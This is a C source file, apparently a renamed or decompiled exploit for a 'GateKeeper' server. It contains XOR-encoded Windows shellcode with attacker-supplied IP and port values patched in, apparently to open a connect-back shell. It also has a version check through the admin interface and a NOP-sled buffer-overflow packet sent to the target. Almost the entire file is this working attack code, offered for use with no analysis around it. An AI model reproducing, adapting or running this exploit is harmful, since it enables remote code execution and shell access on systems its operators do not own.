
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int useme ;
typedef int shellc0de ;
typedef int buffer ;
typedef int WSADATA ;


 int VAR_0 ;
 unsigned char VAR_1 ;
 unsigned char VAR_2 ;
 int VAR_3 ;
 char* VAR_4 ;
 char* VAR_5 ;
 unsigned long VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 char* VAR_9 ;
 scalar_t__ FUNC_0 (int,int *) ;
 unsigned long FUNC_1 (char*) ;
 int FUNC_2 () ;
 int FUNC_3 (int) ;
 int FUNC_4 (char*,int ) ;
 unsigned long FUNC_5 (unsigned short) ;
 int FUNC_6 (char*) ;
 int FUNC_7 (char*,...) ;
 int FUNC_8 (char*,int,int) ;
 int FUNC_9 (char*,...) ;
 int FUNC_10 (int,char*,int,int ) ;
 int FUNC_11 (int,char*,int,int ) ;
 int FUNC_12 (char*) ;
 scalar_t__ FUNC_13 (char*,char*,int) ;
 char* FUNC_14 (char*,char*) ;
 int FUNC_15 (char*) ;

int FUNC_16(int VAR_10, char *VAR_11[])
 {
        WSADATA VAR_12;
        int VAR_13;
        char VAR_14[1024],VAR_15[VAR_8],*VAR_16;
        unsigned long VAR_17,VAR_18;
        unsigned int VAR_19;
        char VAR_20[] =

        "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66"
        "\xb9\x33\x01\x80\x33\x95\x43\xe2\xfa"

        "\x1e\x61\xc0\xc3\xf1\x34\xa5"
        "\x95\x95\x95\x1e\xd5\x99\x1e\xe5\x89\x38\x1e\xfd\x9d\x7e\x95\x1e"
        "\x50\xcb\xc8\x1c\x93\x6a\xa3\xfd\x1b\xdb\x9b\x79\x7d\x38\x95\x95"
        "\x95\xfd\xa6\xa7\x95\x95\xfd\xe2\xe6\xa7\xca\xc1\x6a\x45\x1e\x6d"
        "\xc2\xfd\x4c\x9c\x60\x38\x7d\x06\x95\x95\x95\xa6\x5c\xc4\xc4\xc4"
        "\xc4\xd4\xc4\xd4\xc4\x6a\x45\x1c\xd3\xb1\xc2\xfd\x79\x6c\x3f\xf5"
        "\x7d\xec\x95\x95\x95\xfd\xd4\xd4\xd4\xd4\xfd\xd7\xd7\xd7\xd7\x1e"
        "\x59\xff\x85\xc4\x6a\xe3\xb1\x6a\x45\xfd\xf6\xf8\xf1\x95\x1c\xf3"
        "\xa5\x6a\xa3\xfd\xe7\x6b\x26\x83\x7d\xc4\x95\x95\x95\x1c\xd3\x8b"
        "\x16\x79\xc1\x18\xa9\xb1\xa6\x55\xa6\x5c\x16\x54\x80\x3e\x77\x68"
        "\x53\xd1\xb1\x85\xd1\x6b\xd1\xb1\xa8\x6b\xd1\xb1\xa9\x1e\xd3\xb1"
        "\x1c\xd1\xb1\xdd\x1c\xd1\xb1\xd9\x1c\xd1\xb1\xc5\x18\xd1\xb1\x85"
        "\xc1\xc5\xc4\xc4\xc4\xff\x94\xc4\xc4\x6a\xe3\xa5\xc4\x6a\xc3\x8b"
        "\x6a\xa3\xfd\x7a\x5b\x75\xf5\x7d\x97\x95\x95\x95\x6a\x45\xc6\xc0"
        "\xc3\xc2\x1e\xf9\xb1\x8d\x1e\xd0\xa9\x1e\xc1\x90\xed\x96\x40\x1e"
        "\xdf\x8d\x1e\xcf\xb5\x96\x48\x76\xa7\xdc\x1e\xa1\x1e\x96\x60\xa6"
        "\x6a\x69\xa6\x55\x39\xaf\x51\xe1\x92\x54\x5a\x98\x96\x6d\x7e\x67"
        "\xae\xe9\xb1\x81\xe0\x74\x1e\xcf\xb1\x96\x48\xf3\x1e\x99\xde\x1e"
        "\xcf\x89\x96\x48\x1e\x91\x1e\x96\x50\x7e\x97\xa6\x55\x1e\x40\xca"
        "\xcb\xc8\xce\x57\x91\x95";

        FUNC_2();

 if(VAR_10!=4)
        FUNC_15(VAR_11[0]);
        VAR_17=FUNC_6(VAR_11[2])^0x95959595;
        VAR_18=FUNC_1(VAR_11[3]);
        if(VAR_18<=0||VAR_18>65535) {
                FUNC_9("error: <port> must be between 1 and 65535\r\n");
                return -1;
        }
        VAR_18=FUNC_5((unsigned short)VAR_18);
        VAR_18=VAR_18<<16;
        VAR_18+=0x0002;
        VAR_18=VAR_18^0x95959595;

 for(VAR_19=0;VAR_19<sizeof(VAR_20);VAR_19++) {
        if((unsigned char)VAR_20[VAR_19]==VAR_1&&(unsigned char)VAR_20[VAR_19+1]==VAR_1)
                if((unsigned char)VAR_20[VAR_19+2]==VAR_1&&(unsigned char)VAR_20[VAR_19+3]==VAR_1) {
                        FUNC_7(&VAR_20[VAR_19],&VAR_17,4);
                        VAR_17=0;
                        }
        if((unsigned char)VAR_20[VAR_19]==VAR_2&&(unsigned char)VAR_20[VAR_19+1]==VAR_2)
                if((unsigned char)VAR_20[VAR_19+2]==VAR_2&&(unsigned char)VAR_20[VAR_19+3]==VAR_2) {
                        FUNC_7(&VAR_20[VAR_19],&VAR_18,4);
                        VAR_18=0;
                        }
 }
 if(VAR_17||VAR_18) {
        FUNC_9("[i] error: unabled to find ip/port sequence in shellc0de\r\n");
        return -1;
        }

 if(FUNC_0(0x0101,&VAR_12)!=0) {
        FUNC_9("[i] error: unable to load winsock\r\n");
        return -1;
        }
        FUNC_9("[-] Getting version through administration interface\r\n");
        VAR_13=FUNC_4(VAR_11[1],VAR_0);
 if(!VAR_13)
        FUNC_9("[i] warning: couldn't connect to admin int to get version, trying anyway\r\n");
 else {
        FUNC_11(VAR_13,"I'm a script kiddie\r\n",21,0);
        FUNC_8(VAR_14,0,sizeof(VAR_14));
        FUNC_10(VAR_13,VAR_14,sizeof(VAR_14),0);
        FUNC_8(VAR_14,0,sizeof(VAR_14));
        FUNC_10(VAR_13,VAR_14,sizeof(VAR_14),0);
        VAR_16=FUNC_14(VAR_14,"GateKeeper@");
 if(!VAR_16)
        FUNC_9("[i] waring: version not found, trying anyway\r\n");
 else {
        VAR_16+=11;
        if(FUNC_13(VAR_16,VAR_9,FUNC_12(VAR_9))) {
                FUNC_9("[i] error: wrong version\r\n");
                return -1;
        }
        FUNC_9("[i] %-44s ...OK\r\n","version");
        }
 }
        FUNC_9("[i] Starting to exploit\r\n");
        VAR_13=FUNC_4(VAR_11[1],VAR_3);
 if(!VAR_13)
        return -1;
        FUNC_9("[i] Preparing magic %-28s ...","packet");
        FUNC_8(VAR_15,0x90,VAR_8);
        FUNC_7(&VAR_15[VAR_7-0x8ac],VAR_20,sizeof(VAR_20));
        *(unsigned long*)&VAR_15[VAR_7] = VAR_6;
        FUNC_7(&VAR_15[VAR_7+12],"\xe9\xed\xf6\xff\xff",5);
        FUNC_9("Done\r\n");
        FUNC_9("[i] Sending magic packet                         ...");
        FUNC_11(VAR_13,VAR_4,FUNC_12(VAR_4),0);
        FUNC_11(VAR_13,VAR_15,sizeof(VAR_15),0);
        FUNC_11(VAR_13,VAR_5,FUNC_12(VAR_5),0);
        FUNC_9("Done\r\n");
        FUNC_3(VAR_13);
        return 0;
 }
